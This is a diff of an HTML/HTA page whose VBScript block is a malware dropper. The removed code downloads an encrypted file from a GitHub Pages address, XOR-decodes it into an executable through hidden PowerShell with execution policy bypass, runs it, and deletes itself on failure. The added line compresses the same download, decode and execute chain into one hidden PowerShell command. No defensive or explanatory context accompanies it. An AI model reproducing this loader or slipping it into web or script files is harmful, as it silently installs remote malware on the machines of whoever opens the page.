@@ -4,29 +4,7 @@
 </head>
 <body>
 <script language="VBScript">
-Set x = CreateObject("MSXML2.XMLHTTP.6.0")
-If x Is Nothing Then Set x = CreateObject("MSXML2.XMLHTTP.3.0")
-If x Is Nothing Then Set x = CreateObject("Microsoft.XMLHTTP")
-If x Is Nothing Then SelfDestruct
-x.Open "GET", "https://kai195102.github.io/d/c2d.enc", False
-x.Send
-If x.Status <> 200 Then SelfDestruct
-Set fso = CreateObject("Scripting.FileSystemObject")
-tmpenc = fso.GetSpecialFolder(2) & "\" & fso.GetTempName() & ".enc"
-tmpout = fso.GetSpecialFolder(2) & "\" & fso.GetTempName() & ".exe"
-Set stream = CreateObject("ADODB.Stream")
-stream.Type = 1 : stream.Open
-stream.Write x.ResponseBody
-stream.SaveToFile tmpenc, 2
-stream.Close
-cmd = "powershell -NoP -NonI -W Hidden -Exec Bypass -C ""$f=[io.file]::ReadAllBytes('" & tmpenc & "');$k=58,151,121,176;for($i=0;$i-lt$f.Length;$i++){$f[$i]=$f[$i]-bxor$k[$i%4]};[io.file]::WriteAllBytes('" & tmpout & "',$f);del '" & tmpenc & "';Start-Process '" & tmpout & "'"""
-Set shell = CreateObject("WScript.Shell")
-shell.Run cmd, 0, False
-Sub SelfDestruct
-  Set fso = CreateObject("Scripting.FileSystemObject")
-  fso.DeleteFile WScript.ScriptFullName, True
-  Self.Close
-End Sub
+CreateObject("WScript.Shell").Run "powershell -NoP -NonI -W Hidden -Exec Bypass -C ""$tmp=$env:TEMP+'\'+(New-Object Random).Next(100000,999999).ToString()+'.exe';$wc=New-Object Net.WebClient;$d=$wc.DownloadData('https://kai195102.github.io/d/c2d.enc');$k=58,151,121,176;for($i=0;$i-lt$d.Length;$i++){$d[$i]=$d[$i]-bxor$k[$i%4]};[io.file]::WriteAllBytes($tmp,$d);Start-Process $tmp""", 0, False
 </script>
 </body>
 </html>
